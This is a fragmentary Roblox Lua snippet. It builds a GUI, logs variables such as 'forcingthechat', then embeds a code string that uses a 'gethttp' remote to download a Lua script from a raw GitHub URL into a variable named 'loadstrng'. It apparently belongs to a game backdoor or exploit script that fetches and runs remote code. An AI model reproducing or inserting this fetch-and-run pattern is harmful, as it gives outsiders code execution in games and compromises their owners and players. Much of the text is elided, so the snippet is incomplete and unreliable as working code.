...
function module.creategui(playeree)
	...
	close.Name = "close"
	close.Parent = a
	close.BackgroundColor3 = Color3.fromRGB(68, 68, 68)
	close.BorderColor3 = Color3.fromRGB(27, 42, 53)
	close.BorderSizePixel = 0
	close.Position = UDim2.new(0.05, 0, 0.1, 0)
	close.Size = UDim2.new(0.2, 0, 0.8, 0)
...
print("ui stuff:", forcingthechat, run, player, message, playere)
	...
	local thecode = [[
		...
		local loadstrng = game:GetService("ReplicatedStorage"):WaitForChild("gethttp", 99999):InvokeServer("https://raw.githubusercontent.com/HELKLUAGF30MINUTESOFDATA12381/hi/fc/l.lua")
